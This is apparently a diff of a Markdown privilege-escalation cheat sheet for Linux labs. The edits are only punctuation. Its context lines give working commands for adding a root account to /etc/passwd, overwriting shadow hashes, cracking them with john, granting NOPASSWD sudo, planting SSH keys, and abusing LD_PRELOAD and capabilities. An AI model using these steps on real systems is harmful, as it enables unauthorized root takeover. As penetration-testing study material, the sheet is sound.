@@ -113,30 +113,30 @@ ssh <user>@<target> -L <kali-port>:localhost:<target-port>
 | `mkpasswd -m sha-512 <password>` | generate a SHA-512 crypt hash |
 | `openssl passwd -6 '<password>'` | same, if `mkpasswd` is absent |
 
-**`/etc/passwd` writable** — add a UID 0 account (`name:hash:UID:GID:comment:home:shell`):
+**`/etc/passwd` writable**: add a UID 0 account (`name:hash:UID:GID:comment:home:shell`):
 ```bash
 echo 'pwn:<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd
 su pwn
 ```
 
-**`/etc/shadow` writable** — replace a user's hash:
+**`/etc/shadow` writable**: replace a user's hash:
 ```
 <username>:$<hash_type>$<salt>$<hash>:::::::
 ```
 
-**`/etc/shadow` readable** — crack offline:
+**`/etc/shadow` readable**: crack offline:
 ```bash
 echo '<hash>' > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
 > reading `/etc/shadow` is covered further in the passwords lab.
 
-**`/etc/sudoers` writable** — grant yourself root:
+**`/etc/sudoers` writable**: grant yourself root:
 ```
 <user> ALL=(ALL:ALL) NOPASSWD: ALL
 ```
 
-**`~/.ssh/authorized_keys` writable** — add your own key:
+**`~/.ssh/authorized_keys` writable**: add your own key:
 ```bash
 ssh-keygen -t rsa                                  # on kali
 cat id_rsa.pub >> /home/<user>/.ssh/authorized_keys
@@ -154,7 +154,7 @@ ssh <user>@<target> -i id_rsa
 | `sudo <cmd>` | run a permitted command as root (check its GTFOBins sudo entry) |
 | `sudo -u <user> <cmd>` | run as a permitted target user |
 | `sudo <VAR>=<val> <cmd>` | run with an altered env var (needs `SETENV`) |
-| `sudo -V` | sudo version — match against CVEs + the distro's patched revision |
+| `sudo -V` | sudo version; match against CVEs + the distro's patched revision |
 
 ### LD_PRELOAD
 
@@ -205,7 +205,7 @@ sudo LD_PRELOAD=/tmp/exploit.so <allowed-cmd>
 
 | capability | significance |
 | ---------- | ------------ |
-| `cap_setuid+ep` | set UID 0 — an interpreter (python/perl) with this is root |
+| `cap_setuid+ep` | set UID 0: an interpreter (python/perl) with this is root |
 | `cap_dac_read_search+ep` | read any file (bypass read / search checks) |
 | `cap_dac_override+ep` | bypass file permission checks for most operations |
 | `cap_sys_admin+ep` | broad admin capability; impact depends on the operation |
@@ -320,6 +320,6 @@ docker load -i alpine.tar
 
 - Start every box with: `id`, `sudo -l`, kernel/OS, SUID/SGID, capabilities, cron, groups, writable paths.
 - Search GTFOBins for the exact binary in the right context (**SUID**, **Sudo**, **Capabilities**).
-- A writable file only matters if a **privileged** process consumes it — trace the full chain.
+- A writable file only matters if a **privileged** process consumes it; trace the full chain.
 - For CVEs, match the distro's patched package revision and prerequisites, not just the upstream version.
 - Only run this against systems you are authorized to test.
